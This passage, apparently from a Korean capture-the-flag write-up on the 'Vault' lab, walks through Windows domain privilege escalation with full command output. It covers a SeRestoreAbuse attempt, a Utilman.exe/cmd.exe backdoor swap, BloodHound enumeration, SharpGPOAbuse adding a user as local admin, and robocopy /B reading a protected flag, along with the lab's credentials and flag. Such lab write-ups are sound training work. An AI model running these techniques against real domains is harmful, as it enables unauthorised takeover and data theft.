그 다음 `SeRestoreAbuse` 를 작동시켜 보았으나 성공하지 못했다. 다른 블로그에서는 된다고 하는데, 나는 성공하지 못했다. 아래 에러에서 나와 있듯이 `Secondary Logon` 에 대해서 `seclogon` 서비스를 강제 시작하려고 했으나, 현재 권한으로는 실행하지 못하기 때문이라고 한다. 

```bash
*Evil-WinRM* PS C:\Users\anirudh\Desktop> .\SeRestoreAbuse.exe .\reverse.exe
RegCreateKeyExA result: 0
RegSetValueExA result: 0
SeRestoreAbuse.exe : start-service : Service 'Secondary Logon (seclogon)' cannot be started due to the following error: Cannot start

    + CategoryInfo          : NotSpecified: (start-service :...Cannot start
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe : service seclogon on computer '.'.

    + CategoryInfo          : NotSpecified: (service seclogon on computer '.'.
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe : At line:1 char:24

    + CategoryInfo          : NotSpecified: (At line:1 char:24
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe : + get-service seclogon | start-service

    + CategoryInfo          : NotSpecified: (+ get-service seclogon | start-service
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe : +                        ~~~~~~~~~~~~~

    + CategoryInfo          : NotSpecified: (+                        ~~~~~~~~~~~~~
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe :     + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],

    + CategoryInfo          : NotSpecified: (    + CategoryI...t-Service],
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe :    ServiceCommandException

    + CategoryInfo          : NotSpecified: (   ServiceCommandException
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe :     + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand

    + CategoryInfo          : NotSpecified: (    + FullyQual...erviceCommand
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
SeRestoreAbuse.exe :

    + CategoryInfo          : NotSpecified: (
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

## 3.7. utilman 조작

`utilman` 을 조작하는 기법에 대해서도 찾아봤다.

```bash
*Evil-WinRM* PS C:\Users\anirudh> cd C:\Windows\system32
*Evil-WinRM* PS C:\Windows\system32> ren Utilman.exe Utilman.old
*Evil-WinRM* PS C:\Windows\system32> ren cmd.exe Utilman.exe
```

근데 원격 접속 자체가 안 되니까 어짜피 못 쓴다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# xfreerdp3 /v:192.168.165.172 /u:anirudh /p:'SecureHM'
[10:49:46:029] [560008:00088b89] [ERROR][com.freerdp.client.x11] - [xf_setup_x11]: failed to open display:
[10:49:46:029] [560008:00088b89] [ERROR][com.freerdp.client.x11] - [xf_setup_x11]: Please check that the $DISPLAY environment variable is properly set.
[10:49:46:029] [560008:00088b89] [ERROR][com.freerdp.core] - [freerdp_connect_begin]: ERRCONNECT_PRE_CONNECT_FAILED [0x00020001]
[10:49:46:029] [560008:00088b89] [ERROR][com.freerdp.core] - [freerdp_connect_begin]: freerdp_pre_connect failed: CLIENT_STATE_PRECONNECT_PASSED
```

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# rdesktop $IP
Autoselecting keyboard map 'en-us' from locale
UI(error): ui_init(), failed to open X11 display:
```

## 3.8. SharpGPOAbuse

### 3.8.1. bloodhound-python

`bloodhound-python` 을 이용해서 내부 유저들의 관계도를 살펴본다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# bloodhound-python -u anirudh -p "SecureHM" -d vault.offsec -ns $IP -gc vault.offsec -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vault.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.vault.offsec
INFO: Done in 00M 17S
```

그 중에 우리가 확보한 `anirudh` 는 `default domain policy`에 대해서 `WriteDacl` 의 권한을 갖고 있다. 즉 쓰기 권한을 갖고 있다는 뜻이다. 

![](../images/WindowsAD-04.%20Vault-1.png)

### 3.8.2. GPO Abuse

위의 권한은 `GPO` 에 대해서 조작이 가능하므로 `sharpgpoabuse` 바이너리를 이용한다. 해당 바이너리는 아래의 경로에서 다운받을 수 있다. 

https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master

```bash
*Evil-WinRM* PS C:\Users\anirudh> upload SharpGPOAbuse.exe

Info: Uploading /home/kali/PG/Vault/SharpGPOAbuse.exe to C:\Users\anirudh\SharpGPOAbuse.exe

Data: 94888 bytes of 94888 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\anirudh> .\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

그 다음 강제로 다시 시작을 진행한다. 

```bash
*Evil-WinRM* PS C:\Users\anirudh> gpupdate /force

Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

`net localgroup` 을 통해서 관리자를 확인해 보면 아래와 같이 `anirudh` 가 추가된 것을 확인할 수 있다.

```bash
*Evil-WinRM* PS C:\Users\anirudh> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
anirudh
The command completed successfully.
```

하지만 `administrator` 의 데스크탑에서 `proof.txt` 를 확인하려고 하면 되지 않는다. 권한이 없다고 한다.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
Access to the path 'C:\Users\Administrator\Desktop\proof.txt' is denied.
At line:1 char:1
+ type proof.txt
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\proof.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/14/2026   9:29 PM             34 proof.txt

```

`icacls` 이나 `takeown /f` 를 이용해서 권한을 뺏어오려고해도 그럴 권한이 없다는 내용을 반복하며 플래그를 획득 할 수 없었다. 

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> icacls proof.txt /grant anirudh:F
icacls.exe : proof.txt: Access is denied.
    + CategoryInfo          : NotSpecified: (proof.txt: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Successfully processed 0 files; Failed processing 1 files

*Evil-WinRM* PS C:\Users\Administrator\Desktop> takeown /f proof.txt
takeown.exe : ERROR: The current logged on user does not have ownership privileges on
    + CategoryInfo          : NotSpecified: (ERROR: The curr...p privileges on:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

`whoami /priv` 를 했을 때 `SeBackupPrivilege` 의 권한이 있음을 확인하였으므로 `robocopy` 를 이용해 `tmp` 폴더에 복사한 후 열어본다. 그리고 정상적으로 플래그를 획득할 수 있었다. 

근데 이 방법은 조금 이상하다고 할 수 있는게, 굳이 관리자 권한을 획득하지 않아도 되기 때문에 이렇게 보여도 되는지 여부는 모르겠다. 머신을 새로 시작해서 아래와 같은 과정을 거치면 관리자 권한을 획득하지 않고도 proof.txt 를 확인할 수 있었기 때문이다. 

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> robocopy C:\Users\Administrator\Desktop C:\Temp proof.txt /B

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, February 14, 2026 10:59:04 PM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\Temp\

    Files : proof.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	  New Dir          1	C:\Users\Administrator\Desktop\
	    New File  		      34	proof.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Saturday, February 14, 2026 10:59:05 PM
   
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat C:\Temp\proof.txt
cad7d206b38c96468456f93a9ed66657
```
